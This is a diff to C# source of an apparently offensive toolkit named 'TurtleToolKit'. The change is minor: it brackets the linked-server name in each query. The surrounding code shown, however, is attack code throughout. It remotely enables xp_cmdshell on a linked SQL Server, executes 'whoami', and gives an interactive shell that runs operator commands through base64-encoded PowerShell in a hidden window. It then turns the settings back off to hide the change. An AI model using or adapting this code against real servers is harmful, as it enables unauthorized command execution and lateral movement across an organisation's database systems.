@@ -110,14 +110,14 @@ namespace TurtleToolKit
                 return false;
             }
             Console.WriteLine("::: Attempting to enable advanced Options :::");
-            q = string.Format("EXEC ('sp_configure ''Show Advanced Options'',1; RECONFIGURE;') AT {0}", lnkSrv);
+            q = string.Format("EXEC ('sp_configure ''Show Advanced Options'',1; RECONFIGURE;') AT [{0}]", lnkSrv);
             if (!sqlObj.PerformQuery(q))
             {
                 Console.WriteLine("Failed to enable advanced options");
                 return false;
             }
             Console.WriteLine("::: Attempting to enabled xpCMDSHELL :::");
-            q = string.Format("EXEC ('sp_configure ''xp_cmdshell'',1; RECONFIGURE;') AT {0}", lnkSrv);
+            q = string.Format("EXEC ('sp_configure ''xp_cmdshell'',1; RECONFIGURE;') AT [{0}]", lnkSrv);
             if (!sqlObj.PerformQuery(q))
             {
                 Console.WriteLine("Failed to enable xp_cmdshell");
@@ -125,7 +125,7 @@ namespace TurtleToolKit
             }
             // Attempting to start 'interactive shell'
             // EXEC ('xp_cmdshell ''whoami''') AT $currentSrv
-            q = string.Format("EXEC ('xp_cmdshell ''whoami''') AT {0}", lnkSrv);
+            q = string.Format("EXEC ('xp_cmdshell ''whoami''') AT [{0}]", lnkSrv);
             if (!sqlObj.PerformQuery(q))
             {
                 Console.WriteLine("Failed to execute whoami command");
@@ -140,7 +140,7 @@ namespace TurtleToolKit
                 if (cmd == "EXIT") { break; }
                 string payload = Convert.ToBase64String(Encoding.Unicode.GetBytes(cmd));
                 //q = string.Format("EXEC ('xp_cmdshell ''whoami''') AT {0}", lnkSrv);
-                q = string.Format("EXEC ('xp_cmdshell ''powershell.exe -NonI -Nop -windowstyle hidden -ec {0}''') AT {1}", payload, lnkSrv);
+                q = string.Format("EXEC ('xp_cmdshell ''powershell.exe -NonI -Nop -windowstyle hidden -ec {0}''') AT [{1}]", payload, lnkSrv);
                 if (!sqlObj.PerformQuery(q))
                 {
                     Console.WriteLine("Failed to execute command");
@@ -203,13 +203,13 @@ namespace TurtleToolKit
         }
         public static bool RevertSettingsLnk(SQL sqlObj,string lnkSrv)
         {
-            string q = string.Format("EXEC ('sp_configure ''xp_cmdshell'',0; RECONFIGURE;') AT {0}", lnkSrv);
+            string q = string.Format("EXEC ('sp_configure ''xp_cmdshell'',0; RECONFIGURE;') AT [{0}]", lnkSrv);
             if (!sqlObj.PerformQuery(q))
             {
                 Console.WriteLine("Failed to revert xp_cmdshell");
                 return false;
             }
-            q = string.Format("EXEC ('sp_configure ''Show Advanced Options'',0; RECONFIGURE;') AT {0}", lnkSrv);
+            q = string.Format("EXEC ('sp_configure ''Show Advanced Options'',0; RECONFIGURE;') AT [{0}]", lnkSrv);
             if (!sqlObj.PerformQuery(q))
             {
                 Console.WriteLine("Failed to revert advanced options");
